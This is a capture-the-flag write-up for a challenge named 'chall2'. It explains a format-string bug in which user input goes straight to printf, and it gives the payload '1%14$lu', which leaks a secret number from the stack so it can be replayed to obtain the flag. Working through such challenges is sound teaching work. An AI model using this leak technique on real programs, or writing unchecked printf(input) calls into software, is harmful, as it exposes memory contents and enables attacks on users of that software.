# chall2

## Summary

This challenge is a format-string leak with a built-in retry.

The program generates a random `unsigned long secret_num`, asks for a guess, and compares the
returned value to that secret. If the first guess is wrong, it gives us a second try using the same
`secret_num`.

The bug is that `get_guess()` prints our input with `printf(input)`, so we can leak `secret_num`
from the caller's stack on the first attempt and then send it back on the second.

## Vulnerable Code

The relevant function is:

```c
unsigned long get_guess(){
    char input[22];
    unsigned long guess;
    printf("Enter your guess (between 1 and 18446744073709551615): ");
    fgets(input, sizeof(input), stdin);
    guess = strtoul(input, NULL, 0);
    if (!guess){
        printf("Guess not allowed %s\n", input);
        return 0;
    }
    printf(input);
    printf("What an interesting guess...\n");
    return guess;
}
```

`strtoul()` parses the numeric prefix, but the original string is still passed directly to
`printf()`. That gives us a classic format-string primitive.

## Why `1%14$lu` Works

The trick is to keep the parsed guess non-zero while still supplying a format string. The payload is:

```text
1%14$lu
```

This does two useful things:

- `strtoul("1%14$lu", ...)` returns `1`, so we avoid the `Guess not allowed` path
- `printf(input)` interprets `%14$lu` and prints the 14th stack argument as an unsigned long

In this binary, stack slot `14` contains `secret_num` from `main()`. A local verification run
shows exactly that behavior:

```text
112265992178869958035
What an interesting guess...
Because I'm nice, I'll give you one more shot
```

The leading `1` is the literal character from the payload. The rest is the leaked secret, so:

```text
secret_num = 12265992178869958035
```

## Exploit Flow

`main()` stores the random number once:

```c
unsigned long secret_num = get_secure_random();
guess = get_guess();
if (guess == secret_num) { ... }
printf("Because I'm nice, I'll give you one more shot.\n\n");
guess = get_guess();
if (guess == secret_num) { ... }
```

So the exploit is:

1. send `1%14$lu`
2. parse the leaked `secret_num`
3. wait for the second prompt
4. send the leaked number back exactly

That reaches:

```c
printf("Second time's the charm\n");
print_flag();
```

## Files

- `solve.py`: remote exploit for `chal.bearcatctf.io:20011`

## Notes

The challenge bundle includes the C source, so the bug is straightforward to confirm statically. I
also verified the full exploit path locally with a temporary dummy `flag.txt`, which produced:

```text
Second time's the charm
BCCTF{local_test_flag}
```
